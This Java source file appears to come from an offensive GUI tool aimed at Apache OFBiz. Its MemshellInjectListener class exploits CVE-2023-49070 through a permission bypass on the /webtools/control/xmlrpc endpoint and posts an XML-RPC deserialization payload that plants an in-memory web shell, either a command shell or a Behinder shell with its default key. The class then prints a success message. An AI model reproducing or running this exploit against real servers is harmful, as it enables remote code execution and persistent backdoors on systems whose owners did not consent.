package org.ofbiz.listener;

import org.ofbiz.shell.ShellManager;
import org.ofbiz.util.Http;

import javax.swing.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.util.Enumeration;

import static org.ofbiz.shell.ShellManager.*;
import static org.ofbiz.util.Check.*;

public class MemshellInjectListener implements ActionListener {
    private ButtonGroup buttonGroup;
    private JTextArea outputTextArea;
    private JTextField textField;

    private static final String CMD_BUTTON_TEXT = "CMD (Visit /webtools/*)";
    private static final String BEHINDER_BUTTON_TEXT = "Behinder (Default key)";


    public MemshellInjectListener(ButtonGroup buttonGroup, JTextArea outputTextArea, JTextField textField){
        this.buttonGroup = buttonGroup;
        this.outputTextArea = outputTextArea;
        this.textField = textField;

    }

    @Override
    public void actionPerformed(ActionEvent e) {
        String url = textField.getText();

        if (url.equals("") || !VulCheckListener.hasCheck || !VulCheckListener.has_cve_2023_49070){
            JOptionPane.showMessageDialog(textField.getParent(), "No Vulnerability or Not check yet", "Error", JOptionPane.ERROR_MESSAGE);
            return;
        }

        Enumeration<AbstractButton> buttons = buttonGroup.getElements();
        boolean isSelected = false;

        if(url.endsWith("/")){
            url = url.substring(0, url.length() - 1);
        }

        String vulUrl = url + "/webtools/control/xmlrpc;?" + PERMISSION_TEXT;
        String body = "";

        while (buttons.hasMoreElements()) {
            AbstractButton button = buttons.nextElement();
            if (button.isSelected()) {
                String selectedButtonText = button.getText();
                switch (selectedButtonText){
                    case CMD_BUTTON_TEXT:
                        body = ShellManager.getXmlrpcDeserializable(CMD_MEMSHELL);
                        isSelected = true;
                        break;
                    case BEHINDER_BUTTON_TEXT:
                        body = ShellManager.getXmlrpcDeserializable(BEHINDER_MEMSHELL);
                        isSelected = true;
                        break;
                }
                break;
            }
        }

        if (!isSelected) {
            JOptionPane.showMessageDialog(textField.getParent(), "Select Type!", "Error", JOptionPane.ERROR_MESSAGE);
            return;
        }

        Http.sendHttpsPostRequest(vulUrl, body, "application/xml");
        Http.sendHttpsPostRequest(vulUrl, body, "application/xml");

        outputTextArea.append("[+] Inject Success!\n");
    }
}
